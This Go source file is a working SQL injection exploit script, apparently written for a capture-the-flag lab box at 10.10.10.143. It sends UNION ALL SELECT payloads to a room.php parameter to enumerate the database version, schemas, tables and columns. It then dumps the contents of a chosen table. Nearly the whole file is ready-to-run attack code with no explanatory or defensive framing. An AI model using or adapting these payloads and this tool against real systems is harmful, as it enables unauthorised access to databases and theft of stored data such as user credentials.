package main

import (
	"flag"
	"fmt"
	"io"
	"net/http"
	"strings"

	"golang.org/x/net/html"
)

type Result struct {
	success bool
	result  string
}

type Exploit struct {
	Url string
}

func (e *Exploit) PrintResult(res Result) {
	if !res.success {
		fmt.Println("[-] Exploit failed!.... Abort")
		return
	}
	fmt.Printf("[+] Exploit result: %s \n", res.result)
}

func (e *Exploit) enumerateDatabase(payload string) Result {
	payload = strings.ReplaceAll(payload, " ", "%20")
	fmt.Printf("[+] Payload: %s\n", payload)

	res := Result{
		success: false,
		result:  "",
	}

	sqliURL := fmt.Sprintf("%s%s", e.Url, payload)
	resp, err := http.Get(sqliURL)
	if err != nil {
		fmt.Printf("[-] HTTP request failed for: %s\n", err)
		return res
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Printf("[-] Failed to read the response body: %s\n", err)
		return res
	}

	payloadResult := parseHTMLForH3(string(body))
	if payloadResult == "" {
		fmt.Println("[-] No result :(")
		return res
	}

	res.success = true
	res.result = payloadResult
	return res
}

func parseHTMLForH3(htmlContent string) string {
	doc, err := html.Parse(strings.NewReader(htmlContent))
	if err != nil {
		fmt.Printf("[-] Failed to parse HTML: %s", err)
		return ""
	}

	var traverse func(*html.Node) string
	traverse = func(node *html.Node) string {
		if node.Type == html.ElementNode && node.Data == "h3" && node.FirstChild != nil {
			if node.FirstChild.Type == html.ElementNode && node.FirstChild.Data == "a" && node.FirstChild.FirstChild != nil {
				return node.FirstChild.FirstChild.Data
			} else if node.FirstChild.Type == html.TextNode {
				return node.FirstChild.Data
			}
		}

		for child := node.FirstChild; child != nil; child = child.NextSibling {
			res := traverse(child)
			if res != "" {
				return res
			}
		}
		return ""
	}

	return traverse(doc)
}

func versionExploit(exploit *Exploit) Result {
	fmt.Println("[+] Version Exploit --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,@@version,3,4,5,6,7; -- -"
	return exploit.enumerateDatabase(payload)
}

func schemaExploit(exploit *Exploit) Result {
	fmt.Println("[+] Schema Exploit --------------------------------------------------------------------------------------")

	payload := "7 UNION ALL SELECT 1,GROUP_CONCAT(schema_name),3,4,5,6,7 FROM information_schema.schemata; -- -"
	return exploit.enumerateDatabase(payload)
}

func tableExploit(exploit *Exploit, schemaName string) Result {
	fmt.Println("[+] Tables Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(table_name),3,4,5,6,7 FROM information_schema.tables WHERE table_schema='%s'; -- -", schemaName)
	return exploit.enumerateDatabase(payload)
}

func columnExploit(exploit *Exploit, tableName string) Result {
	fmt.Println("[+] Columns Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(column_name),3,4,5,6,7 FROM information_schema.columns WHERE table_name='%s'; -- -", tableName)
	return exploit.enumerateDatabase(payload)
}

func dataExploit(exploit *Exploit, tableName string, columnNames string) Result {
	fmt.Println("[+] Data Exploit --------------------------------------------------------------------------------------")

	payload := fmt.Sprintf("7 UNION ALL SELECT 1,GROUP_CONCAT(%s),3,4,5,6,7 FROM %s; -- -", columnNames, tableName)
	return exploit.enumerateDatabase(payload)
}

func formatColumnNames(input string) string {
	parts := strings.Split(input, ",")

	var result []string
	for i, part := range parts {
		result = append(result, part)
		if i < len(parts)-1 {
			result = append(result, "0x7c")
		}
	}
	output := strings.Join(result, ",")

	return output
}

func main() {
	url := "http://10.10.10.143/room.php?cod="
	exploit := Exploit{
		Url: url,
	}

	defaultFuncs := []func(*Exploit) Result{
		versionExploit,
		schemaExploit,
	}

	for _, defaultFunc := range defaultFuncs {
		res := defaultFunc(&exploit)
		exploit.PrintResult(res)
	}

	schemaName := flag.String("s", "", "Enumerates tables from the schema name")
	tableName := flag.String("t", "", "Enumerates columns from the table name")
	flag.Parse()

	if *schemaName != "" {
		res := tableExploit(&exploit, *schemaName)
		exploit.PrintResult(res)
	}

	if *tableName != "" {
		res := columnExploit(&exploit, *tableName)
		exploit.PrintResult(res)

		columnNames := formatColumnNames(res.result)
		res = dataExploit(&exploit, *tableName, columnNames)
		exploit.PrintResult(res)
	}
}
